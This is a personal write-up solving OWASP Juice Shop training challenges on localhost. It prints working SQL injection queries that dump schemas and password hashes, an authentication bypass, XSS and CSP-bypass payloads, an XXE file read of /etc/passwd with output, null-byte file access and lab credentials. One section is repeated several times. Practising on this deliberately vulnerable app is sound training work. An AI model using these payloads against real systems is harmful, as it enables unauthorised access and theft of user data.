Author : Tin Kit
This is my writeup for OWASP Juice-Shop.
I did not include the writeups for challenges that were quick and easy to solve: mostly challenges with Stars 0,1,2.

======= Stars 1 =======

admin@juice-shop
admin123

# normal account
abc@hacks.com
abcde1


Challenge: Retrieve the photo of Bjoern's cat in "melee combat mode".
1. Go to `PhotoWall` and we see an alt. text of failed-to-load img
2. Inspect element and right click on the img link
	a. Link:http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-#zatschi-#whoneedsfourlegs-1572600969477.jpg
3. # is not properly url-encoded, and this causes the img. to fail to load
4. replace # with %23 to properly load the img.



Challenge: Meta Geo Stalking
1. Download John's Image to retrieve the meta data
2. Coordinates are 36.958717N 84.348217W
3. Google search results gives Daniel Boone National Forest

new creds
john@juice-sh.op
123123123


======== Stars 2 ========

Challenge: Visual Geo Stalking
1. In Photo Wall Section, download Emma's Image
2. Zoom in to the left, we see ITsec.
3. Go to Forget Password, we guess emma's email as emma@juice-sh.op
4. Guess password as ITsec

new creds
emma@juice-sh.op
123123123

======= Stars 3 =======

Challenge: API-only XSS
1. Using Burp Suite, look at HTTP History after visting web pages.
2. Looking at js files with Debugger, we know there are /api/Products endpoints.
3. In Burp Suite, send one /api/quantity to repeater and change dest. to /api/Products/6 where 6 is the Pdt. ID 
4. Change the method to PUT to update the resource. 
5. Attempt to change the description value, but we need admin Authorisation Token. We can steal that after logging in as admin. (Done in previous challenges)
6. We then change the description to the following:
	{"description": "<iframe src=\"javascript:alert(`xss`)\">" }
7. Take note that we need to escape the quotations. 
8. Finish. 


Challenge: Admin Registration
1. OWASP API 
2. With Burp Suite running in the background, we register a user with normal priveledges.
3. Since we know there are more fields returned in the response than in the request, we can try to assign the fields that we want to change.
4. role:admin
5. Done


Challenge:  Bjoern's Favorite Pet
1. OSINT. https://www.youtube.com/watch?v=Lu0-kDdtVf4
2. bjoern@owasp.org
3. Security Question: Zaya

New Creds
bjoern@owasp.org
password


Challenge: CAPTCHA Bypass
1. Use Burpsuite to check out the pages loaded when loading the Feedback page and when submitting a Feedback. We get pages of the following paths:
	a. /rest/captcha
	b. /rest/use/whoami
	c. /api/Feedbacks
2. The response to /rest/captcha leaks the answer in JSON and notice that captchaId increments with step size of 1 each time a request is sent. So we can craft a bash script that curls this path to get the ID and answer.
3. We craft a POST request and embed the ID and answer fields, also take include a header for Content-Type to be applcation/json4. Iterate this 2 cmds 10 times in a for loop and we solve this Challenge.

Script used: captcha-bypass.sh

Challenge: Database Schema
1. Use Burpsuite to capture the pages when searching for a product at homepage
2. There is an endpoint that potentially interacts with the database
	a. /rest/products/search?q=
3. We can tinker with this:
	a. GET /rest/products/search?q=applke'))UNION%20SELECT%201,2,3,4,5,6,7,8,9%20FROM%20sqlite_master-- HTTP/1.1
	b. %20 is required for url to decode as space at server side.
	c. We are using UNION to query both applke and the sqlite_master schema
4. We get back a successful resposne from the database. We now know the TABLE column names.

{"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}

5. GET /rest/products/search?q=applke'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master-- HTTP/1.1
	a. This allows us to get the schema.



Challenge: Deluxe Fraud
1. Navigate to Deluxe Membership as a regular-permissioned user.
2. Inspect Element on Payment Button "Pay 49.00" and remove "disabled=true" together with the portion of the classname with disabled in it. Proberly has some js script that applies logic to disable the button.
3. Click the button with burpsuite running.
	a. POST Request is made. 
	b. {"paymentMode":"wallet"}
4. We can remove the value "wallet" and replace it with an empty string.
	a. And we get a success message back. 
	b. Apparently the server-side logic failed to check for empty payment modes. 


Challenge: GDPR Data Erasure
1. Just trying to guess Chris's email as chris@juice-sh.op and using SQL Injection for password as 'or 1=1-- fails. This is not surprising.
2. From the previous challenge, we were able to get the schema from SQL db
	a. One interesting table is: `Privacy Requests`
	b. "CREATE TABLE `PrivacyRequests` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `deletionRequested` TINYINT(1) DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
	b. Creds of chris:
		i. chris.pike@juice-sh.op
		ii. 10a783b9ed19ea1c67c3a27699f0095b

	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
	b. Creds of chris:
		i. chris.pike@juice-sh.op
		ii. 10a783b9ed19ea1c67c3a27699f0095b

	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
	b. Creds of chris:
		i. chris.pike@juice-sh.op
		ii. 10a783b9ed19ea1c67c3a27699f0095b

	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
	b. Creds of chris:
		i. chris.pike@juice-sh.op
		ii. 10a783b9ed19ea1c67c3a27699f0095b

	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
	b. Creds of chris:
		i. chris.pike@juice-sh.op
		ii. 10a783b9ed19ea1c67c3a27699f0095b
4. We log in with just chris email, adding '-- at the back to comment out the rest of the SQL checks
	a. This allows us to log in with any password
	b. eg: chris.pike@juice-sh.op'--
5. Done

Challenge: Login Amy
1. "One Important Final Note" is described as follows:
The example with “D0g.....................” should not be taken literally because if everyone began padding their passwords with simple dots, attackers would soon start adding dots to their guesses to bypass the need for full searching through unknown padding. Instead, YOU should invent your own personal padding policy. You could put some padding in front, and/or interspersed through the phrase, and/or add some more to the end. You could put some characters at the beginning, padding in the middle, and more characters at the end. And also mix-up the padding characters by using simple memorable character pictures like “<->” or “[*]” or “^-^”  . . . but do invent your own!

If you make the result long and memorable, you'll have super-strong passwords that are also easy to use! 
2. Also, we know amy's email address from the previous SQL injection
	a. amy@juice-sh.op
	b. 030f05e45e30710c3ad3c32f00de0473
3. Although we can bypass the password check by adding '-- to the back of her email, we do not pass this challenge as we ARE NOT logging in with her orginal creds.
	a. We need to find her password. 
	b. crackstation returns nothing on that hash.
4. After googling "One Important Final Note" -> We get led to this site https://www.grc.com/haystack.htm?id
5. From "One Important Final Note", we can swap out "D0g" with "K1f" [Her husband's name] and add periods "." to the end of it in GRC's Interactive Brute Force Password "Search Space" Calculator until it reaches 93.83 billion trillion trillion centuries as hinted in the Challenge Statment.
6. Login to finish the challenge.

Challenge: Login Bender
1. From previous SQL Injection, we know Bender's email address as bender@juice-sh.op with password hash as 0c36e517e3fa95aabf1bbffc6744a4ef.
2. Logging in as bender@juice-sh.op'-- allows us to bypass the password check
3. We can use ANY password to login. 
4. Done.

Challenge: Login Jim
1. Same as Challenge titled "Login Bender"

Challenge: Manipulate Basket
1. First we login as normal user, capture REQ and RESP with Burpsuite. Since I just completed the previous Challenge, I'd use Jim's account instead. You can sign up as a new user as well. 
2. When adding an item to basket, we can see a POST Req to /api/BasketItems/
	a. {"ProductId":24,"BasketId":"2","quantity":1}
3. We can attempt to change the BasketId to add to another User's Basket.
	a. Send to Repeater, change BasketId.
	b. It gives 'Invalid BasketId'. 
	c. Sending the same POST Req. returns a validation error
		i. BasketId must be valid.
	d. We change "ProductId" to 1, and a success message is returned.
		i. We can validate by heading over to our Basket to see the new item being added to our basket.
4. We refer to https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution
	a. Testing for HTTP Parameter Pollution.
	b. We send more than 1 instance of BasketId fields and see how the server handles that. 
	c. Sending 
{
	"ProductId":10,
	"BasketId":"2",
	"BasketId":"3",
	"quantity":1
}
	d. Returns "success" message and Challenge is completed.


Challenge: PayBack Time
1. This is a classic attack.
2. When adding to basket, we see a POST REQ made to /api/BasketItems/ with payload of {"ProductId":6,"BasketId":"2","quantity":1}
3. We change the quantity to -100 to attempt to checkout.
	a. The request is successful and we can confirm this with the negative qty of the item in our UI.
4. Now we will use the UI to checkout. Challenge completed. 
5. The whole idea is to pay negative dollars to get a total postive value in our digital wallet. 

Challenge: Privacy Policy Inspection
Hint: Only by visiting a special URL you can confirm that you read it carefully. If you find some particularly hot sections in the policy you might want to melt them together.
1. We navigate to Juice Shops's  Privacy Policy page.
2. Inspect Element when we see the first "hot" section.
	a. The html element has a class name associated to "hot"
	b. Using Console in DevTools, we can get all HTML elements of that class name using document.getElementsByClassName('hot')
	c. It returns a HTML Collection of 6 elements --> we have 6 hot sections.
	d. Concatentating all of them in a URL, we get http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
3. Challenge Completed. Interesting.

Challenge: Product Tampering
1. In Burpsuite, we make a request to /api/Products to get all Products listed in the website.
	a. We can see that Product Name of "OWASP SSL Advanced Forensic Tool (O-Saft)" is assigned to and id:9
	b. make a GET request to /api/Products/9
	c. making a PUT request to /api/Products/9 with {"description":"<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"} 
		i. Sending this PUT request does not change the description.
		ii. Adding a header --> Content-Type: application/json
		iii. Description is changed.
4. Challenge Completed.


Challenge: Reset Jim's Password
1. Jim's security question: Your eldest sibling's middle name?
2. Clicking on the Hints, we know Jim is a celebrity.
3. Searching Jim star trek and his eldest sibling is George Samuel Kirk.
	a. Ans to security question is Samuel

Challenge: Upload Size
1. Log in as any user and navigate to Complaints Tab at http://localhost:3000/#/complain
2. We are unable to attach a document of size > 100KB. 
	a. Proberbly some client side filtering is going on. 
3. We see in Burpsuite POST to /file-upload is made
4. Trying to manually send a file rockyou.pdf [size=134M] failed.
	a. This might mean that there are server-side filtering for upper file size limit.
5. Sending a a random pdf of size=113K works using curl -F 'file=@/home/kali/Desktop/juice-shop_12.3.0/notes/a.pdf' http://localhost:3000/file-upload
6. Challenge Completed.

Challenge: Upload Type
1. Navigate to /complain and we get an ERROR:Forbidden file type. Only PDF, ZIP allowed. when we try to upload files of types otherwise specified.
2. There might be Client-side filtering, lets manually send the file using curl to the endpoint /file-upload
	a. curl -F 'file=@/home/kali/Desktop/juice-shop_12.3.0/notes/a.jpg' http://localhost:3000/file-upload
	b. WORKS. 
3. Challenge Completed.

Challenge: XXE Data Access
Hint: The leverage point for this challenge is the deprecated B2B interface. --> From previous chalenge, we know the deprecated B2B interface is the complain
1. Since we know we can upload .xml files; lets try XXE Injections.
2. I'd send a file: b.xml that has <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root> written in it.3. Using curl -F 'file=@/home/kali/Desktop/juice-shop_12.3.0/notes/b.xml' http://localhost:3000/file-upload
	a. It succesfully retreives /etc/passwd
---Contents---
file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;root:x:0:0:root:/root:/usr/bin/zshdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/v... 
----


====== Stars 4 =====

Challenge: Access Log
0. We can use fuff or any website fuzzer to find the /ftp directory.
	a. We already know /ftp exists because of a previous challenge.
1. Searching around, I found incident-support.kdbx in /ftp --> it's a KeePass database file. Let's try to crack it; This may or may not be relevant for this challenge. 
	a. Run it through keepass2john incident-support.kdbx > KeePass.hash
	b. incident-support:$keepass$*2*1*0*49dc48964f1b17385923c8421b4c5f07e159657a9af8814e05e135c34d2ea7e9*3602c14dffbd103014d7f56dd6c6641cb00a43f7346e8119fef5e4b15e1f6fa8*1cc4846f661c02ecc025bd917d9c34f8*b5b2a2ebcc864d164086407c8e67ca91fd03d21c1c26178b1da0cc2ff49f8534*5e830b9b4ff18ed529be50b548bc746be048399e1a4d778dfad3c4c4623bc507
	c. Delete the pre-pended db name in the hash
	d. $keepass$*2*1*0*49dc48964f1b17385923c8421b4c5f07e159657a9af8814e05e135c34d2ea7e9*3602c14dffbd103014d7f56dd6c6641cb00a43f7346e8119fef5e4b15e1f6fa8*1cc4846f661c02ecc025bd917d9c34f8*b5b2a2ebcc864d164086407c8e67ca91fd03d21c1c26178b1da0cc2ff49f8534*5e830b9b4ff18ed529be50b548bc746be048399e1a4d778dfad3c4c4623bc507
	e. Hashcat couldn't crack it. Tested wordlists
		i. rockyou.txt
		ii. seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
2. I couldn't figure this out and went to https://www.youtube.com/watch?v=RBTfGk-ZwnY to get an answer.
	a. Apparently, the access logs are hidden behind /support directory.
	b. with ffuf, it didn't identity the directory.
3. Assuming that we know there is /support directory, we can conduct fuzzing once more
	a. ./ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost:3000/support/FUZZ -fs 1925 | tee ffuf.txt
	b. Results are: Logs, logs. Navigating to /support/Logs and /support/logs shows us the pages where access logs are kept.
4. Challenge Completed. 

Challenge: Allow Bypass
1. We can find a number of redirect endpoints in debugger --> main-es2018.js
	a. https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm
	b. https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW
	c. https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6
	d. /redirect?to=http://shop.spreadshirt.com/juiceshop
	e. /redirect?to=http://shop.spreadshirt.de/juiceshop
	f. /redirect?to=https://www.stickeryou.com/products/owasp-juice-shop/794
	e. /redirect?to=http://leanpub.com/juice-shop
	g. /redirect?to=https://github.com/bkimminich/juice-shop
2. When trying to redirect to another page using Repeater in burpsuite, we get and error message: Error: Unrecognized target URL for redirect: https://google.com
	a. GET /redirect?to=https://google.com HTTP/1.1
	b. Tampering with the redirect link as such; still yields a succesfull redirect
		i.GET /redirect?to=ahttps://github.com/bkimminich/juice-shop HTTP/1.1
		ii. GET /redirect?to=https://github.com/bkimminich/juice-shopa HTTP/1.1
	c. This might mean that the server side logic did not handle validation properly.
	d. Playing around with the redirect link, we get a succesful redirect to google.com using 
		i. localhost:3000/redirect?to=https://google.com/https://github.com/bkimminich/juice-shop/../../../../../
		ii. The ../ is to cdout of the legitimate link and for the redirect to effectively be localhost:3000/redirect?to=https://google.com
3. Challenge Completed.

Challenge: CSP Bypass
1. For webpages to be enabled with CSP, the server is required to return the Content-Security-Policy HTTP header (sometimes referred to as X-Content-Security-Policy Header). Alternatively, <meta> element can be used to configure a policy.
	a. <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
2. The page identified is localhost:3000/profile with CSP: img-src 'self' assets/public/images/uploads/default.svg; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
3. Failed to write "Set Username" field value of <script>alert(`xss`)</script>. The input was santised to lert(`xss`)</script>
4. <<a|ascript>alert(`xss`)</script> returns <script>alert(`xss`)</script> but Username is now \
	a. Console raises Error: Content Security Policy: The page’s settings blocked the loading of a resource at inline (“script-src”).
5. Resources that may be useful:
	a. https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/
	b. https://www.youtube.com/watch?v=J90t0h0AP1U
6. Following guide in OWASP Juice Shop solutions, we can see that we are able to add invalid urls to CSP
	a. https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' 
	b. This allows us to amend the CSP itself.
7. After amending the CSP, we can type in "<<a|ascript>alert(`xss`)</script>" to "Set Username" field to execute XSS
8. Challenge Completed.

Challenge: Easter Egg
Hint: If you solved one of the three file access challenges, you already fknow where to find the easter egg.
1. Navigate to http://localhost:3000/ftp and we see there is a file called eastere.gg
	a. Let's download it --> Error: Only .md and .pdf files are allowed
	b. We can bypass this by adding null byte: %2500 to the back of the file
	c. http://localhost:3000/ftp/eastere.gg%2500.md
2. Challenge Solved.
3. Looking inside the file, we see a base64 string, decoding it gives:
	a. /gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
	b. Might be useful in the future.

Challenge: Ephemeral Accountant
1. We know the backend is using sqlite db; we are interested with `Users` table. 

"CREATE TABLE `Users` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT, 
`username` VARCHAR(255) DEFAULT '', 
`email` VARCHAR(255) UNIQUE, 
`password` VARCHAR(255), 
`role` VARCHAR(255) DEFAULT 'customer', 
`deluxeToken` VARCHAR(255) DEFAULT '', 
`lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', 
`profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', 
`totpSecret` VARCHAR(255) DEFAULT '', 
`isActive` TINYINT(1) DEFAULT 1, 
`createdAt` DATETIME NOT NULL, 
`updatedAt` DATETIME NOT NULL, 
`deletedAt` DATETIME)"

2. SQL Injection with UNION to fill in all fields of the above `Users` table to complete this challenge.
-- SQL Injection Payload --
' UNION SELECT * FROM (SELECT 1 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '123' as 'password', 'accounting' as 'role', '' as 'deluxeToken', '127.0.0.1' as 'lastLoginIp', 'default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--

	a. IDs up to 20 returns a succesful creation of the non-existant account.
	b. IDs after 20 returns ERROR: SQLITE_CONSTRAINT: FOREIGN KEY constraint failed
3. Challenge Completed.

Challenge: Expired Coupon
Hint: Try to identify past special event or holiday campaigns of the shop first.
1. Looking at Juice Shop Home Page, we can identify a few special events:
	a. Juice Shop "Permafrost" 2020 Edition
	b. Juice Shop Adversary Trading Card (Common/Super Rare)
	c. Melon Bike (Comeback-Product 2018 Edition)
	d. OWASP Juice Shop "King of the Hill" Facemask	
2. We have to log in to redeem the coupon. To redeem a coupon, we need to purchase any item --> /localhost:3000/#/payment/shop
	a.  Coupon code must be 10 characters long. <-- after entering som random words into the Coupon field.
3. Submitting Coupon Code:PermaFrost, we get [object Object] on the UI.
	a. Further Investigation in burpsuite shows the object returned:
{
  "error": {
    "message": "jwt expired",
    "name": "UnauthorizedError",
    "code": "invalid_token",
    "status": 401,
    "inner": {}
  }
}
	b. After logout and login and trying to redeem the coupon code:PermaFrost, `Invalid coupon` is being returned --> wrong code...
	c. Looking at the PUT Request, we can see that the coupon code is added to the path PUT /rest/basket/2/coupon/PermaFrost HTTP/1.1
	d. I could brute force the code, but I'd try to see if there are any coupons leaked within the loaded js files --> debugger in DevTools.
4. In main-es2018.js, we find an interesting object --> this.campaigns
this.campaigns = {
WMNSDY2019: {
validOn: 1551999600000,
discount: 75
},
WMNSDY2020: {
validOn: 1583622000000,
discount: 60
},
WMNSDY2021: {
validOn: 1615158000000,
discount: 60
},
WMNSDY2022: {
validOn: 1646694000000,
discount: 60
},
WMNSDY2023: {
validOn: 1678230000000,
discount: 60
},
ORANGE2020: {
validOn: 1588546800000,
discount: 50
},
ORANGE2021: {
validOn: 1620082800000,
discount: 40
},
ORANGE2022: {
validOn: 1651618800000,
discount: 40
},
ORANGE2023: {
validOn: 1683154800000,
discount: 40
}
}
5. Each coupon code as a validOn field, seems to be on valid on that date/time.
	a. For WMNSDY2019, converting epoch time 1551999600000 gives Thu Mar 07 2019 18:00:00 GMT-0500 (Eastern Standard Time).
	b. Let's change our computer's time to match that.
	c. I will change my host machines time to 07 Mar 2019 18:00:00 and the VM will sync to that. Submitting this code fails; looking at debugger, there seems to be a time offset.
	d. Changing host time to 8 Mar 2019 18:00:00 solve this issue.
6. Challenge Completed.

Challenge: Forgetten Sales Backup
1. Navigate to localhost:3000/ftp and download coupons_2013.md.bak
	a. Use null byte attack to bypass filter --> coupons_2013.md.bak%00.md
2.Challenge Completed.

Challenge: GDPR Data Theft
1. Navigate to localhost:3000/#/privacy-security/data-export and capture traffic with burpsuite in the background while exporting data in json
	a. Request Data Export only available in JSON, not PDF or Excel.
	b. Response :
{"userData":"{\n  \"username\": \"\",\n  \"email\": \"jim@juice-sh.op\",\n  \"orders\": [],\n  \"reviews\": [\n    {\n      \"message\": \"Looks so much better on my uniform than the boring Starfleet symbol.\",\n      \"author\": \"jim@juice-sh.op\",\n      \"productId\": 20,\n      \"likesCount\": 0,\n      \"likedBy\": []\n    },\n    {\n      \"message\": \"Fresh out of a replicator.\",\n      \"author\": \"jim@juice-sh.op\",\n      \"productId\": 22,\n      \"likesCount\": 0,\n      \"likedBy\": []\n    },\n    {\n      \"message\": \"Looks spacy on Bones' new tricorder!\",\n      \"author\": \"jim@juice-sh.op\",\n      \"productId\": 37,\n      \"likesCount\": 0,\n      \"likedBy\": []\n    }\n  ],\n  \"memories\": []\n}","confirmation":"Your data export will open in a new Browser window."}
	c. Request = {"format": 1}
	d. No luck in adding more fields to Request JSON such as "email":"another user"
	e. Probably not the way to complete this challenge
2. After making a purchase on a random account and navigating to localhost:3000/rest/track-order/orderId
	a. We can see that the response is as follows:
{"status":"success","data":[{"promotionalAmount":0,"paymentId":"wallet","addressId":"4","orderId":"ad9b-fd8cde5b601484e7","delivered":false,"email":"j*m@j**c*-sh.*p","totalPrice":10.48,"products":[{"quantity":2,"id":4,"name":"Raspberry Juice (1000ml)","price":4.99,"total":9.98,"bonus":0}],"bonus":0,"deliveryPrice":0.5,"eta":"3","_id":"hPKX2AZQ6wrsx6mXD"}]}
	b. email field has some letters replaced with the * character. 
3. Create a new account with those letters replaced and see if we get the same behavior.
	a. jbm@jadce-sh.lp 
	b. pass:123123123
	c. The success response message is as follows:
{"status":"success","data":[{"promotionalAmount":0,"paymentId":"7","addressId":"7","orderId":"5a5f-b85f0acf93ad1b71","delivered":false,"email":"jbm@j*dc*-sh.lp","totalPrice":1.88,"products":[{"quantity":1,"id":24,"name":"Apple Pomace","price":0.89,"total":0.89,"bonus":0}],"bonus":0,"deliveryPrice":0.99,"eta":"1","_id":"vjpRAYnvDYEZKRhih"}]}
	d. email field is jbm@j*dc*-sh.lp
	e. looks like only vowels were replaced --> Let's create an email with a different vowels and those positions of jim's account.
	f.  jam@juice-sh.op
4. Navigating to Order History, we get a list of orders even though this is a fresh account. But this did not trigger the Notificaion that says Challenge Completed.
5. Only after requesting Data Export, did the Notification pop up.
6. Challenge Complete.

Challenge: HTTP-Header XSS
1. Need to find a web page that calls the http header; this allows the persisted XSS attack to be loaded --> Probably "Last Login IP"
	a. There is no request made when navigating to http://localhost:3000/#/privacy-security/last-login-ip and we see this behavior with burpsuite while navigating the webpage. 
	b. When logging out, we see a GET Request made to /rest/saveLoginIP
	c. Adding HTTP Header of True-Client-IP:1.2.3.4 allowed us to see the last saved IP to be exactly that when we relogin into the same account and navigate to /privacy-security/last-login-ip
2. Replace the value field of True-Client-IP with the payload and we are done.
3. For reasons unknown to me, I was not able to repeat the GET request to /rest/saveLoginIP with the extra Header. I completed this challenge by editing the GET request using DevTools.
3. Challenge Completed.


Challenge: Leaked Unsafe Product
1. We can look at the previous SQL Injection where we exfiltrated the schema. In it was a table named Products, which is interesting to us.	
2. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20FROM%20Products-- HTTP/1.1 
	a. This allows us to exfiltrate the Products table.
	b. One Product's (Rippertuer Special Juice) description caught my attention --> This item has been made unavailable because of lack of safety standards.
3. The full description is
"Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br/><span style=\"color:red;\">This item has been made unavailable because of lack of safety standards.</span> (This product is unsafe! We plan to remove it from the stock!)"
	a. Ingredients used : Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos
	b. The listed Ingredients are not dangerous. Informing the site with those names will not complete the challenge.
	c. Searching in Goolge with the keyword as Rippertuer Special Juicec leads us to a pastebin page https://pastebin.com/90dUgd7s. I saved the text into rippertuer-special-juice.txt
	d. Ingreidents that are dangerous are : Eurogium Edule and Hueteroneel
4. Challenge Completed.

Challenge: Legacy Typosquatting
1. Download package.json.bak%00.md using null byte injection.
2. Look at the dependencies --> There is one typo: epilogue-js, it should be epilogue
3. Submit this in feedback form to complete the challenge. 
4. This takes time to check each dependency.
5. Challenge Completed.

Challenge: Login Bjoern
1. Using the previous SQL Injection, we can query Users table with this GET Request:
GET /rest/products/search?q=applke'))UNION%20SELECT%20oid,username,email,password,role,deluxeToken,lastLoginIp,8,9%20FROM%20Users-- HTTP/1.1
2. We find Bjoern's details as such:
{"id":4,"name":"bkimminich","description":"bjoern.kimminich@gmail.com","price":"6edd9d726cbdc873c539e41ae8757b8c","deluxePrice":"admin","image":"","createdAt":"0.0.0.0","updatedAt":8,"deletedAt":9}
3. We can also find his email account with OSINT.
4. Looking at main-es2018.js and searching OAUTH, this section of code is interesting:
ngOnInit() {
          this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe(t=>{
            let e = btoa(t.email.split('').reverse().join(''));
            this.userService.save({
              email: t.email,
              password: e,
              passwordRepeat: e
            }).subscribe(() =>{
              this.login(t)
            }, () =>this.login(t))
          }, t=>{
            this.invalidateSession(t),
            this.ngZone.run(() =>this.router.navigate(['/login']))
          })
        }

5. The above function first saves the users' email, password before proceeding to log in.
6. btoa() encodes a string in b64; atob() decodes the b64 string.
7. It looks like e is set as the  password; such a configuration is wrong. --> the password is hardcoded into main-es2018.js as the b64 encoded string of the reversed email account
8. email: bjoern.kimminich@gmail.com | password: b64.encode(moc.liamg@hcinimmik.nreojb) --> bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
9. Challenge Completed.

Challenge:  Misplaced Signature File
1. In http://localhost:3000/ftp, we see a file named suspicious_errors.yml and we know a yml file is part of sigma's schema. 
2. Download that file using null byte injection --> suspicious_errors.yml%2500.pdf
3. Challenge Completed
 
Challenge: Nested Easter Egg
